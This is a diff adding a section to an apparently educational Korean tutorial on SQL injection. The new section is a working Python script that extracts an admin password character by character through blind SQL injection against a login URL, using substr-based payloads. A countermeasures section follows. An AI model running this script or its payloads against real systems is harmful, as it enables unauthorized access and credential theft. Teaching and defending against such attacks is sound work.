@@ -54,4 +54,37 @@ select * from user_table where uid='admin' and substr(upw,2,1)='a'--
 # substr 함수 인자 중 두 번째 인자를 2로 변경하여 두 번째 글자를 알아낸다.
 ```
 
+### Blind SQL Injection 테스트 코드 작성
+
+Blind SQL Injection은 한 글자를 여러 개의 문자와 비교하여 원하는 데이터를 알아내는 방식이기 때문에, 자동화 스크립트를 작성하거나 Burp Suite의 Intruder를 사용한다. 아래의 코드는 Blind SQL Injection을 시도하기 위한 일반적인 코드이다.
+
+```python
+#!/usr/bin/python3
+import requests
+import string
+# example URL
+url = 'http://example.com/login'
+params = {
+    'uid': '',
+    'upw': ''
+}
+# ascii printables
+tc = string.printable
+# 사용할 SQL Injection 쿼리
+query = '''admin' and substr(upw,{idx},1)='{val}'-- '''
+password = ''
+# 비밀번호 길이는 20자 이하라 가정
+for idx in range(0, 20):
+    for ch in tc:
+        # query를 이용하여 Blind SQL Injection 시도
+        params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
+        c = requests.get(url, params=params)
+        print(c.request.url)
+        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
+        if c.text.find("Login success") != -1:
+            password += ch
+            break
+print(f"Password is {password}")
+```
+
 # 3. 대응방안
